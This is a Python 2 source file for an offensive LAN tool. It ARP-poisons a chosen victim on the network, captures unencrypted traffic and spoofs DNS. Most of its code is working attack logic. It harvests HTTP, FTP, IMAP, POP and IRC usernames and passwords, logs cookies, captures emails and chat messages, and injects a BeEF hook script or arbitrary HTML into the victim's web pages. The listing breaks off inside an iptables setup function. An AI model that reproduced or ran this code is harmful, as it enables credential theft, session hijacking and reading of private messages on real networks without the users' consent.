#!/usr/bin/env python2
'''
Description:   ARP poisons a LAN victim and prints all the interesting unencrypted info like usernames, passwords and messages. Asynchronous multithreaded arp spoofing packet parser.
Prerequisites: Linux
               nmap (optional)
               nbtscan (optional)
               aircrack-ng
            Python 2.6+
               nfqueue-bindings 0.4-3
               scapy
               twisted

Note:          This script flushes iptables before and after usage.

To do:         1. Rogue DHCP server
            Refactor with lots of smaller functions
            Mass wifi jammer
            Cookie saver so you can browse using their cookies (how to use nfqueue with multiple queues?)
            Add karma MITM technique
            Add SSL proxy for self-signed cert, and make the script force a single JS popup saying there's a temporary problem with SSL validation and to just click through
            Integrate with wifite

'''
__author__ = 'Dan McInerney'
__license__ = 'BSD'
__contact__ = 'danhmcinerney with gmail'
__version__ = 1.1


def module_check(module):
   '''
   Just for debian-based systems like Kali and Ubuntu
   '''
   ri = raw_input('[-] python-%s not installed, would you like to install now? (apt-get install -y python-%s will be run if yes) [y/n]: ' % (module, module))
   if ri == 'y':
      os.system('apt-get install -y python-%s' % module)
   else:
      exit('[-] Exiting due to missing dependency')

import os
try:
   import nfqueue
except Exception:
   module_check('nfqueue')
   import nfqueue
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
try:
   from scapy.all import *
except Exception:
   module_check('scapy')
   from scapy.all import *
conf.verb=0
#Below is necessary to receive a response to the DHCP packets because we're sending to 255.255.255.255 but receiving from the IP of the DHCP server
conf.checkIPaddr=0
try:
   from twisted.internet import reactor
except Exception:
   module_check('twisted')
   from twisted.internet import reactor
from twisted.internet.interfaces import IReadDescriptor
from twisted.internet.protocol import Protocol, Factory
from sys import exit
from threading import Thread
import argparse
import signal
from base64 import b64decode
from subprocess import *
from zlib import decompressobj, decompress
import gzip
from cStringIO import StringIO
import requests

def parse_args():
   #Create the arguments
   parser = argparse.ArgumentParser()

   parser.add_argument("-b", "--beef", help="Inject a BeEF hook URL. Example usage: -b http://192.168.0.3:3000/hook.js")
   parser.add_argument("-c", "--code", help="Inject arbitrary html. Example usage (include quotes): -c '<title>New title</title>'")
   parser.add_argument("-u", "--urlspy", help="Show all URLs and search terms the victim visits or enters minus URLs that end in .jpg, .png, .gif, .css, and .js to make the output much friendlier. Also truncates URLs at 150 characters. Use -v to print all URLs and without truncation.", action="store_true")
   parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and skip the arp ping at the beginning which would give you a list of possible targets. Usage: -ip <victim IP>")
   parser.add_argument("-vmac", "--victimmac", help="Set the victim MAC; by default the script will attempt a few different ways of getting this so this option hopefully won't be necessary")
   parser.add_argument("-d", "--driftnet", help="Open an xterm window with driftnet.", action="store_true")
   parser.add_argument("-v", "--verboseURL", help="Shows all URLs the victim visits but doesn't limit the URL to 150 characters like -u does.", action="store_true")
   parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument. An argument like [facebook.com] will match all subdomains of facebook.com")
   parser.add_argument("-a", "--dnsall", help="Spoof all DNS responses", action="store_true")
   parser.add_argument("-set", "--setoolkit", help="Start Social Engineer's Toolkit in another window.", action="store_true")
   parser.add_argument("-p", "--post", help="Print unsecured HTTP POST loads, IMAP/POP/FTP/IRC/HTTP usernames/passwords and incoming/outgoing emails. Will also decode base64 encrypted POP/IMAP username/password combos for you.", action="store_true")
   parser.add_argument("-na", "--nmapaggressive", help="Aggressively scan the target for open ports and services in the background. Output to ip.add.re.ss.log.txt where ip.add.re.ss is the victim's IP.", action="store_true")
   parser.add_argument("-n", "--nmap", help="Scan the target for open ports prior to starting to sniffing their packets.", action="store_true")
   parser.add_argument("-i", "--interface", help="Choose the interface to use. Default is the first one that shows up in `ip route`.")
   parser.add_argument("-r", "--redirectto", help="Must be used with -dns DOMAIN option. Redirects the victim to the IP in this argument when they visit the domain in the -dns DOMAIN option")
   parser.add_argument("-rip", "--routerip", help="Set the router IP; by default the script with attempt a few different ways of getting this so this option hopefully won't be necessary")
   parser.add_argument("-rmac", "--routermac", help="Set the router MAC; by default the script with attempt a few different ways of getting this so this option hopefully won't be necessary")
   parser.add_argument("-pcap", "--pcap", help="Parse through a pcap file")

   return parser.parse_args()

#Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan

logger = open('LANspy.log.txt', 'w+')
DN = open(os.devnull, 'w')

class Spoof():
   def originalMAC(self, ip):
      # srp is for layer 2 packets with Ether layer, sr is for layer 3 packets like ARP and IP
      ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
      for s,r in ans:
         return r.sprintf("%Ether.src%")
   def poison(self, routerIP, victimIP, routerMAC, victimMAC):
      send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
      send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
   def restore(self, routerIP, victimIP, routerMAC, victimMAC):
      send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
      send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)

class Parser():

   # Mail, irc, post parsing
   OheadersFound = []
   IheadersFound = []
   IMAPauth = 0
   IMAPdest = ''
   POPauth = 0
   POPdest = ''
   Cookies = []
   IRCnick = ''
   mail_passwds = []
   oldmailack = ''
   oldmailload = ''
   mailfragged = 0

   # http parsing
   oldHTTPack = ''
   oldHTTPload = ''
   HTTPfragged = 0

   # html injection
   block_acks = []
   html_url = ''
   user_agent = None

   def __init__(self, args):
      self.args = args

   def start(self, payload):
      if self.args.pcap:
         if self.args.ipaddress:
            try:
               pkt = payload[IP]
            except Exception:
               return
      else:
         try:
            pkt = IP(payload.get_data())
         except Exception:
            return

      IP_layer = pkt[IP]
      IP_dst = pkt[IP].dst
      IP_src = pkt[IP].src
      if self.args.urlspy or self.args.post or self.args.beef or self.args.code:
         if pkt.haslayer(Raw):
            if pkt.haslayer(TCP):
               dport = pkt[TCP].dport
               sport = pkt[TCP].sport
               ack = pkt[TCP].ack
               seq = pkt[TCP].seq
               load = pkt[Raw].load
               mail_ports = [25, 26, 110, 143]
               if dport in mail_ports or sport in mail_ports:
                  self.mailspy(load, dport, sport, IP_dst, IP_src, mail_ports, ack)
               if dport == 6667 or sport == 6667:
                  self.irc(load, dport, sport, IP_src)
               if dport == 21 or sport == 21:
                  self.ftp(load, IP_dst, IP_src)
               if dport == 80 or sport == 80:
                  self.http_parser(load, ack, dport)
                  if self.args.beef or self.args.code:
                     self.injecthtml(load, ack, pkt, payload, dport, sport)
      if self.args.dnsspoof or self.args.dnsall:
         if pkt.haslayer(DNSQR):
            dport = pkt[UDP].dport
            sport = pkt[UDP].sport
            if dport == 53 or sport == 53:
               dns_layer = pkt[DNS]
               self.dnsspoof(dns_layer, IP_src, IP_dst, sport, dport, payload)

   def get_user_agent(self, header_lines):
      for h in header_lines:
         user_agentre = re.search('[Uu]ser-[Aa]gent: ', h)
         if user_agentre:
            return h.split(user_agentre.group(), 1)[1]

   def injecthtml(self, load, ack, pkt, payload, dport, sport):
      for x in self.block_acks:
         if ack == x:
            payload.set_verdict(nfqueue.NF_DROP)
            return

      ack = str(ack)
      if self.args.beef:
         bhtml = '<script src='+self.args.beef+'></script>'
      if self.args.code:
         chtml = self.args.code

      try:
         headers, body = load.split("\r\n\r\n", 1)
      except Exception:
         headers = load
         body = ''
      header_lines = headers.split("\r\n")

      if dport == 80:
         post = None
         get = self.get_get(header_lines)
         host = self.get_host(header_lines)
         self.html_url = self.get_url(host, get, post)
         if self.html_url:
            d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js', '.svg', '.woff']
            if any(i in self.html_url for i in d):
               self.html_url = None
               payload.set_verdict(nfqueue.NF_ACCEPT)
               return
         else:
            payload.set_verdict(nfqueue.NF_ACCEPT)
            return
         if not self.get_user_agent(header_lines):
            # Most common user-agent on the internet
            self.user_agent = "'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36'"
         else:
            self.user_agent = "'"+self.get_user_agent(header_lines)+"'"
         payload.set_verdict(nfqueue.NF_ACCEPT)
         return

      if sport == 80 and self.html_url and 'Content-Type: text/html' in headers:
         # This can be done better, probably using filter()
         header_lines = [x for x in header_lines if 'transfer-encoding' not in x.lower()]
         for h in header_lines:
            if '1.1 302' in h or '1.1 301' in h: # Allow redirects to go thru unperturbed
               payload.set_verdict(nfqueue.NF_ACCEPT)
               self.html_url = None
               return

         UA_header = {'User-Agent':self.user_agent}
         r = requests.get('http://'+self.html_url, headers=UA_header)
         try:
            body = r.text.encode('utf-8')
         except Exception:
            payload.set_verdict(nfqueue.NF_ACCEPT)

         # INJECT
         if self.args.beef:
            if '<html' in body or '/html>' in body:
               try:
                  psplit = body.split('</head>', 1)
                  body = psplit[0]+bhtml+'</head>'+psplit[1]
               except Exception:
                  try:
                     psplit = body.split('<head>', 1)
                     body = psplit[0]+'<head>'+bhtml+psplit[1]
                  except Exception:
                     if not self.args.code:
                        self.html_url = None
                        payload.set_verdict(nfqueue.NF_ACCEPT)
                        return
                     else:
                        pass
         if self.args.code:
            if '<html' in body or '/html>' in body:
               try:
                  psplit = body.split('<head>', 1)
                  body = psplit[0]+'<head>'+chtml+psplit[1]
               except Exception:
                  try:
                     psplit = body.split('</head>', 1)
                     body = psplit[0]+chtml+'</head>'+psplit[1]
                  except Exception:
                     self.html_url = None
                     payload.set_verdict(nfqueue.NF_ACCEPT)
                     return

         # Recompress data if necessary
         if 'Content-Encoding: gzip' in headers:
            if body != '':
#              debugger = open('injectedBody', 'w') #########################################
#              debugger.write(body) #########################################
#              debugger.close() #########################################
               try:
                  comp_body = StringIO()
                  f = gzip.GzipFile(fileobj=comp_body, mode='w', compresslevel = 9)
                  f.write(body)
                  f.close()
                  body = comp_body.getvalue()
               except Exception:
                  try:
                     pkt[Raw].load = headers+"\r\n\r\n"+body
                     pkt[IP].len = len(str(pkt))
                     del pkt[IP].chksum
                     del pkt[TCP].chksum
                     payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
                     print '[-] Could not recompress html, sent packet as is'
                     self.html_url = None
                     return
                  except Exception:
                     self.html_url = None
                     payload.set_verdict(nfqueue.NF_ACCEPT)
                     return

         headers = "\r\n".join(header_lines)
         pkt[Raw].load = headers+"\r\n\r\n"+body
         pkt[IP].len = len(str(pkt))
         del pkt[IP].chksum
         del pkt[TCP].chksum
         try:
            payload.set_verdict(nfqueue.NF_DROP)
            send(pkt)
#           payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
            print R+'[!] Injected HTML into packet for '+W+self.html_url
            logger.write('[!] Injected HTML into packet for '+self.html_url)
            self.block_acks.append(ack)
            self.html_url = None
         except Exception as e:
            payload.set_verdict(nfqueue.NF_ACCEPT)
            self.html_url = None
            print '[-] Failed to inject packet', e
            return

         if len(self.block_acks) > 30:
            self.block_acks = self.block_acks[5:]

   def get_host(self, header_lines):
      for l in header_lines:
         searchHost = re.search('[Hh]ost: ', l)
         if searchHost:
            try:
               return l.split('Host: ', 1)[1]
            except Exception:
               try:
                  return l.split('host: ', 1)[1]
               except Exception:
                  return

   def get_get(self, header_lines):
      for l in header_lines:
         searchGet = re.search('GET /', l)
         if searchGet:
            try:
               return l.split('GET ')[1].split(' ')[0]
            except Exception:
               return

   def get_post(self, header_lines):
      for l in header_lines:
         searchPost = re.search('POST /', l)
         if searchPost:
            try:
               return l.split(' ')[1].split(' ')[0]
            except Exception:
               return

   def get_url(self, host, get, post):
      if host:
         if post:
            return host+post
         if get:
            return host+get

   # Catch search terms
   # As it stands now this has a moderately high false positive rate mostly due to the common ?s= and ?q= vars
   # I figured better to err on the site of more data than less and it's easy to tell the false positives from the real searches
   def searches(self, url, host):
      # search, query, search?q, ?s, &q, ?q, search?p, searchTerm, keywords, command
      searched = re.search('((search|query|search\?q|\?s|&q|\?q|search\?p|search[Tt]erm|keywords|command)=([^&][^&]*))', url)
      if searched:
         searched = searched.group(3)
         # Common false positives
         if 'select%20*%20from' in searched:
            pass
         if host == 'geo.yahoo.com':
            pass
         else:
            searched = searched.replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=').replace('%22', '\"').replace('%24', '$')
            print T+'[+] Searched '+W+host+T+': '+searched+W
            logger.write('[+] Searched '+host+ ' for: '+searched+'\n')

   def post_parser(self, url, body, host, header_lines):
      if 'ocsp' in url:
         print B+'[+] POST: '+W+url
         logger.write('[+] POST: '+url+'\n')
      elif body != '':
         try:
            urlsplit = url.split('/')
            url = urlsplit[0]+'/'+urlsplit[1]
         except Exception:
            pass
         if self.HTTPfragged == 1:
            print B+'[+] Fragmented POST: '+W+url+B+" HTTP POST's combined load: "+body+W
            logger.write('[+] Fragmented POST: '+url+" HTTP POST's combined load: "+body+'\n')
         else:
            print B+'[+] POST: '+W+url+B+' HTTP POST load: '+body+W
            logger.write('[+] POST: '+url+" HTTP POST's combined load: "+body+'\n')

         # If you see any other login/pw variable names, tell me and I'll add em in here
         # As it stands now this has a moderately high false positive rate; I figured better to err on the site of more data than less
         # email, user, username, name, login, log, loginID
         user_regex = '([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;]*)'
         # password, pass, passwd, pwd, psw, passwrd, passw
         pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|[Pp]asswrd|[Pp]assw)=([^&|;]*)'
         username = re.findall(user_regex, body)
         password = re.findall(pw_regex, body)
         self.user_pass(username, password)
         self.cookies(host, header_lines)

   def http_parser(self, load, ack, dport):

      load = repr(load)[1:-1]

      # Catch fragmented HTTP posts
      if dport == 80 and load != '':
         if ack == self.oldHTTPack:
            self.oldHTTPload = self.oldHTTPload+load
            load = self.oldHTTPload
            self.HTTPfragged = 1
         else:
            self.oldHTTPload = load
            self.oldHTTPack = ack
            self.HTTPfragged = 0
      try:
         headers, body = load.split(r"\r\n\r\n", 1)
      except Exception:
         headers = load
         body = ''
      header_lines = headers.split(r"\r\n")

      host = self.get_host(header_lines)
      get = self.get_get(header_lines)
      post = self.get_post(header_lines)
      url = self.get_url(host, get, post)

      # print urls
      if url:
         #Print the URL
         if self.args.verboseURL:
            print '[*] '+url
            logger.write('[*] '+url+'\n')

         if self.args.urlspy:
            d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js', '.svg', '.woff']
            if any(i in url for i in d):
               return
            if len(url) > 146:
               print '[*] '+url[:145]
               logger.write('[*] '+url[:145]+'\n')
            else:
               print '[*] '+url
               logger.write('[*] '+url+'\n')

         # Print search terms
         if self.args.post or self.args.urlspy:
            self.searches(url, host)

         #Print POST load and find cookies
         if self.args.post and post:
            self.post_parser(url, body, host, header_lines)

   def ftp(self, load, IP_dst, IP_src):
      load = repr(load)[1:-1].replace(r"\r\n", "")
      if 'USER ' in load:
         print R+'[!] FTP '+load+' SERVER: '+IP_dst+W
         logger.write('[!] FTP '+load+' SERVER: '+IP_dst+'\n')
      if 'PASS ' in load:
         print R+'[!] FTP '+load+' SERVER: '+IP_dst+W
         logger.write('[!] FTP '+load+' SERVER: '+IP_dst+'\n')
      if 'authentication failed' in load:
         print R+'[*] FTP '+load+W
         logger.write('[*] FTP '+load+'\n')

   def irc(self, load, dport, sport, IP_src):
         load = repr(load)[1:-1].split(r"\r\n")
         if self.args.post:
            if IP_src == victimIP:
               if 'NICK ' in load[0]:
                  self.IRCnick = load[0].split('NICK ')[1]
                  server = load[1].replace('USER user user ', '').replace(' :user', '')
                  print R+'[!] IRC username: '+self.IRCnick+' on '+server+W
                  logger.write('[!] IRC username: '+self.IRCnick+' on '+server+'\n')
               if 'NS IDENTIFY ' in load[0]:
                  ircpass = load[0].split('NS IDENTIFY ')[1]
                  print R+'[!] IRC password: '+ircpass+W
                  logger.write('[!] IRC password: '+ircpass+'\n')
               if 'JOIN ' in load[0]:
                  join = load[0].split('JOIN ')[1]
                  print C+'[+] IRC joined: '+W+join
                  logger.write('[+] IRC joined: '+join+'\n')
               if 'PART ' in load[0]:
                  part = load[0].split('PART ')[1]
                  print C+'[+] IRC left: '+W+part
                  logger.write('[+] IRC left: '+part+'\n')
               if 'QUIT ' in load[0]:
                  quit = load[0].split('QUIT :')[1]
                  print C+'[+] IRC quit: '+W+quit
                  logger.write('[+] IRC quit: '+quit+'\n')
            # Catch messages from the victim to an IRC channel
            if 'PRIVMSG ' in load[0]:
               if IP_src == victimIP:
                  load = load[0].split('PRIVMSG ')[1]
                  channel = load.split(' :', 1)[0]
                  ircmsg = load.split(' :', 1)[1]
                  if self.IRCnick != '':
                     print C+'[+] IRC victim '+W+self.IRCnick+C+' to '+W+channel+C+': '+ircmsg+W
                     logger.write('[+] IRC '+self.IRCnick+' to '+channel+': '+ircmsg+'\n')
                  else:
                     print C+'[+] IRC msg to '+W+channel+C+': '+ircmsg+W
                     logger.write('[+] IRC msg to '+channel+':'+ircmsg+'\n')
               # Catch messages from others that tag the victim's nick
               elif self.IRCnick in load[0] and self.IRCnick != '':
                  sender_nick = load[0].split(':', 1)[1].split('!', 1)[0]
                  try:
                     load = load[0].split('PRIVMSG ')[1].split(' :', 1)
                     channel = load[0]
                     ircmsg = load[1]
                     print C+'[+] IRC '+W+sender_nick+C+' to '+W+channel+C+': '+ircmsg[1:]+W
                     logger.write('[+] IRC '+sender_nick+' to '+channel+': '+ircmsg[1:]+'\n')
                  except Exception:
                     return

   def cookies(self, host, header_lines):
      for x in header_lines:
         if 'Cookie:' in x:
            if x in self.Cookies:
               return
            elif 'safebrowsing.clients.google.com' in host:
               return
            else:
               self.Cookies.append(x)
            print P+'[+] Cookie found for '+W+host+P+' logged in LANspy.log.txt'+W
            logger.write('[+] Cookie found for'+host+':'+x.replace('Cookie: ', '')+'\n')

   def user_pass(self, username, password):
      if username:
         for u in username:
            print R+'[!] Username found: '+u[1]+W
            logger.write('[!] Username: '+u[1]+'\n')
      if password:
         for p in password:
            if p[1] != '':
               print R+'[!] Password: '+p[1]+W
               logger.write('[!] Password: '+p[1]+'\n')

   def mailspy(self, load, dport, sport, IP_dst, IP_src, mail_ports, ack):
      load = repr(load)[1:-1]
      # Catch fragmented mail packets
      if ack == self.oldmailack:
         if load != r'.\r\n':
            self.oldmailload = self.oldmailload+load
            load = self.oldmailload
            self.mailfragged = 1
      else:
         self.oldmailload = load
         self.oldmailack = ack
         self.mailfragged = 0

      try:
         headers, body = load.split(r"\r\n\r\n", 1)
      except Exception:
         headers = load
         body = ''
      header_lines = headers.split(r"\r\n")
      email_headers = ['Date: ', 'Subject: ', 'To: ', 'From: ']

      # Find passwords
      if dport in [25, 26, 110, 143]:
         self.passwords(IP_src, load, dport, IP_dst)
      # Find outgoing messages
      if dport == 26 or dport == 25:
         self.outgoing(load, body, header_lines, email_headers, IP_src)
      # Find incoming messages
      if sport in [110, 143]:
         self.incoming(headers, body, header_lines, email_headers, sport, dport)

   def passwords(self, IP_src, load, dport, IP_dst):
      load = load.replace(r'\r\n', '')
      if dport == 143 and IP_src == victimIP and len(load) > 15:
         if self.IMAPauth == 1 and self.IMAPdest == IP_dst:
            # Don't double output mail passwords
            for x in self.mail_passwds:
               if load in x:
                  self.IMAPauth = 0
                  self.IMAPdest = ''
                  return
            print R+'[!] IMAP user and pass found: '+load+W
            logger.write('[!] IMAP user and pass found: '+load+'\n')
            self.mail_passwds.append(load)
            self.decode(load, dport)
            self.IMAPauth = 0
            self.IMAPdest = ''
         if "authenticate plain" in load:
            self.IMAPauth = 1
            self.IMAPdest = IP_dst
      if dport == 110 and IP_src == victimIP:
         if self.POPauth == 1 and self.POPdest == IP_dst and len(load) > 10:
            # Don't double output mail passwords
            for x in self.mail_passwds:
               if load in x:
                  self.POPauth = 0
                  self.POPdest = ''
                  return
            print R+'[!] POP user and pass found: '+load+W
            logger.write('[!] POP user and pass found: '+load+'\n')
            self.mail_passwds.append(load)
            self.decode(load, dport)
            self.POPauth = 0
            self.POPdest = ''
         if 'AUTH PLAIN' in load:
            self.POPauth = 1
            self.POPdest = IP_dst
      if dport == 26:
         if 'AUTH PLAIN ' in load:
            # Don't double output mail passwords
            for x in self.mail_passwds:
               if load in x:
                  self.POPauth = 0
                  self.POPdest = ''
                  return
            print R+'[!] Mail authentication found: '+load+W
            logger.write('[!] Mail authentication found: '+load+'\n')
            self.mail_passwds.append(load)
            self.decode(load, dport)

   def outgoing(self, headers, body, header_lines, email_headers, IP_src):
      if 'Message-ID' in headers:
         for l in header_lines:
            for x in email_headers:
               if x in l:
                  self.OheadersFound.append(l)
         # if date, from, to, in headers then print the message
         if len(self.OheadersFound) > 3 and body != '':
            if self.mailfragged == 1:
               print O+'[!] OUTGOING MESSAGE (fragmented)'+W
               logger.write('[!] OUTGOING MESSAGE (fragmented)\n')
               for x in self.OheadersFound:
                  print O+'   ',x+W
                  logger.write(' '+x+'\n')
               print O+'   Message:',body+W
               logger.write(' Message:'+body+'\n')
            else:
               print O+'[!] OUTGOING MESSAGE'+W
               logger.write('[!] OUTGOING MESSAGE\n')
               for x in self.OheadersFound:
                  print O+'   ',x+W
                  logger.write(' '+x+'\n')
               print O+'   Message:',body+W
               logger.write(' Message:'+body+'\n')

      self.OheadersFound = []

   def incoming(self, headers, body, header_lines, email_headers, sport, dport):
      message = ''
      for l in header_lines:
         for x in email_headers:
            if x in l:
               self.IheadersFound.append(l)
      if len(self.IheadersFound) > 3 and body != '':
         if "BODY[TEXT]" not in body:
            try:
               beginning = body.split(r"\r\n", 1)[0]
               body1 = body.split(r"\r\n\r\n", 1)[1]
               message = body1.split(beginning)[0][:-8] #get rid of last \r\n\r\n
            except Exception:
               return
         if message != '':
            if self.mailfragged == 1:
               print O+'[!] INCOMING MESSAGE (fragmented)'+W
               logger.write('[!] INCOMING MESSAGE (fragmented)\n')
               for x in self.IheadersFound:
                  print O+'   '+x+W
                  logger.write(' '+x+'\n')
               print O+'   Message: '+message+W
               logger.write(' Message: '+message+'\n')
            else:
               print O+'[!] INCOMING MESSAGE'+W
               logger.write('[!] INCOMING MESSAGE\n')
               for x in self.IheadersFound:
                  print O+'   '+x+W
                  logger.write(' '+x+'\n')
               print O+'   Message: '+message+W
               logger.write(' Message: '+message+'\n')
      self.IheadersFound = []

   def decode(self, load, dport):
      decoded = ''
      if dport == 25 or dport == 26:
         try:
            b64str = load.replace("AUTH PLAIN ", "").replace(r"\r\n", "")
            decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
         except Exception:
            pass
      else:
         try:
            b64str = load
            decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
         except Exception:
            pass
      # Test to see if decode worked
      if '@' in decoded:
         print R+'[!] Decoded:'+decoded+W
         logger.write('[!] Decoded:'+decoded+'\n')

   # Spoof DNS for a specific domain to point to your machine
   def dnsspoof(self, dns_layer, IP_src, IP_dst, sport, dport, payload):
      localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
      if self.args.dnsspoof:
         if self.args.dnsspoof in dns_layer.qd.qname and not self.args.redirectto:
            self.dnsspoof_actions(dns_layer, IP_src, IP_dst, sport, dport, payload, localIP)
         elif self.args.dnsspoof in dns_layer.qd.qname and self.args.redirectto:
            self.dnsspoof_actions(dns_layer, IP_src, IP_dst, sport, dport, payload, self.args.redirectto)
      elif self.args.dnsall:
         if self.args.redirectto:
            self.dnsspoof_actions(dns_layer, IP_src, IP_dst, sport, dport, payload, self.args.redirectto)
         else:
            self.dnsspoof_actions(dns_layer, IP_src, IP_dst, sport, dport, payload, localIP)


   def dnsspoof_actions(self, dns_layer, IP_src, IP_dst, sport, dport, payload, rIP):
      p = IP(dst=IP_src, src=IP_dst)/UDP(dport=sport, sport=dport)/DNS(id=dns_layer.id, qr=1, aa=1, qd=dns_layer.qd, an=DNSRR(rrname=dns_layer.qd.qname, ttl=10, rdata=rIP))
      payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(p), len(p))
      if self.args.dnsspoof:
         print G+'[!] Sent spoofed packet for '+W+self.args.dnsspoof+G+' to '+W+rIP
         logger.write('[!] Sent spoofed packet for '+self.args.dnsspoof+G+' to '+rIP+'\n')
      elif self.args.dnsall:
         print G+'[!] Sent spoofed packet for '+W+dns_layer[DNSQR].qname[:-1]+G+' to '+W+rIP
         logger.write('[!] Sent spoofed packet for '+dns_layer[DNSQR].qname[:-1]+' to '+rIP+'\n')


#Wrap the nfqueue object in an IReadDescriptor and run the process_pending function in a .doRead() of the twisted IReadDescriptor
class Queued(object):
   def __init__(self, args):
      self.q = nfqueue.queue()
      self.q.set_callback(Parser(args).start)
      self.q.fast_open(0, socket.AF_INET)
      self.q.set_queue_maxlen(5000)
      reactor.addReader(self)
      self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
      print '[*] Flushed firewall and forwarded traffic to the queue; waiting for data'
   def fileno(self):
      return self.q.get_fd()
   def doRead(self):
      self.q.process_pending(500) # if I lower this to, say, 5, it hurts injection's reliability
   def connectionLost(self, reason):
      reactor.removeReader(self)
   def logPrefix(self):
      return 'queued'

class active_users():

   IPandMAC = []
   start_time = time.time()
   current_time = 0
   monmode = ''

   def pkt_cb(self, pkt):
      if pkt.haslayer(Dot11):
         pkt = pkt[Dot11]
         if pkt.type == 2:
            addresses = [pkt.addr1.upper(), pkt.addr2.upper(), pkt.addr3.upper()]
            for x in addresses:
               for y in self.IPandMAC:
                  if x in y[1]:
                     y[2] = y[2]+1
            self.current_time = time.time()
         if self.current_time > self.start_time+1:
            self.IPandMAC.sort(key=lambda x: float(x[2]), reverse=True) # sort by data packets
            os.system('/usr/bin/clear')
            print '[*] '+T+'IP address'+W+' and '+R+'data packets'+W+' sent/received'
            print '---------------------------------------------'
            for x in self.IPandMAC:
               if len(x) == 3:
                  ip = x[0].ljust(16)
                  data = str(x[2]).ljust(5)
                  print T+ip+W, R+data+W
               else:
                  ip = x[0].ljust(16)
                  data = str(x[2]).ljust(5)
                  print T+ip+W, R+data+W, x[3]
            print '\n[*] Hit Ctrl-C at any time to stop and choose a victim IP'
            self.start_time = time.time()

   def users(self, IPprefix, routerIP):

      print '[*] Running ARP scan to identify users on the network; this may take a minute - [nmap -sn -n %s]' % IPprefix
      iplist = []
      maclist = []
      try:
         nmap = Popen(['nmap', '-sn', '-n', IPprefix], stdout=PIPE, stderr=DN)
         nmap = nmap.communicate()[0]
         nmap = nmap.splitlines()[2:-1]
      except Exception:
         print '[-] Nmap ARP ping failed, is nmap installed?'
      for x in nmap:
         if 'Nmap' in x:
            pieces = x.split()
            nmapip = pieces[len(pieces)-1]
            nmapip = nmapip.replace('(','').replace(')','')
            iplist.append(nmapip)
         if 'MAC' in x:
            nmapmac = x.split()[2]
            maclist.append(nmapmac)
      zipped = zip(iplist, maclist)
      self.IPandMAC = [list(item) for item in zipped]

      # Make sure router is caught in the arp ping
      r = 0
      for i in self.IPandMAC:
         i.append(0)
         if r == 0:
            if routerIP == i[0]:
               i.append('router')
               routerMAC = i[1]
               r = 1
      if r == 0:
         exit('[-] Router MAC not found. Exiting.')

      # Do nbtscan for windows netbios names
      print '[*] Running nbtscan to get Windows netbios names - [nbtscan %s]' % IPprefix
      try:
         nbt = Popen(['nbtscan', IPprefix], stdout=PIPE, stderr=DN)
         nbt = nbt.communicate()[0]
         nbt = nbt.splitlines()
         nbt = nbt[4:]
      except Exception:
         print '[-] nbtscan error, are you sure it is installed?'
      for l in nbt:
         try:
            l = l.split()
            nbtip = l[0]
            nbtname = l[1]
         except Exception:
            print '[-] Could not find any netbios names. Continuing without them'
         if nbtip and nbtname:
            for a in self.IPandMAC:
               if nbtip == a[0]:
                  a.append(nbtname)

      # Start monitor mode
      print '[*] Enabling monitor mode [airmon-ng ' + 'start ' + interface + ']'
      try:
         promiscSearch = Popen(['airmon-ng', 'start', '%s' % interface], stdout=PIPE, stderr=DN)
         promisc = promiscSearch.communicate()[0]
         monmodeSearch = re.search('monitor mode enabled on (.+)\)', promisc)
         self.monmode = monmodeSearch.group(1)
      except Exception:
         exit('[-] Enabling monitor mode failed, do you have aircrack-ng installed?')

      sniff(iface=self.monmode, prn=self.pkt_cb, store=0)


#Print all the variables
def print_vars(DHCPsrvr, dnsIP, local_domain, routerIP, victimIP):
   print "[*] Active interface: " + interface
   print "[*] DHCP server: " + DHCPsrvr
   print "[*] DNS server: " + dnsIP
   print "[*] Local domain: " + local_domain
   print "[*] Router IP: " + routerIP
   print "[*] Victim IP: " + victimIP
   logger.write("[*] Router IP: " + routerIP+'\n')
   logger.write("[*] victim IP: " + victimIP+'\n')

#Enable IP forwarding and flush possibly conflicting iptables rules
def setup(victimMAC):
   os.system('/sbin/iptables -F')
   os.system('/sbin/iptables -X')
   os.system('/sbin/iptables -t nat -F')
   os.system('/sbin/iptables -t nat -X')
   # Just throw packets that are from and to the victim into the reactor
   os.system('/sbin/iptables -A FORWARD -p tcp -s %s -m multiport --dports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
   os.system('/sbin/iptables -A FORWARD -p tcp -d %s -m multiport --dports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
   os.system('/sbin/iptables -A FORWARD -p tcp -s %s -m multiport --sports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
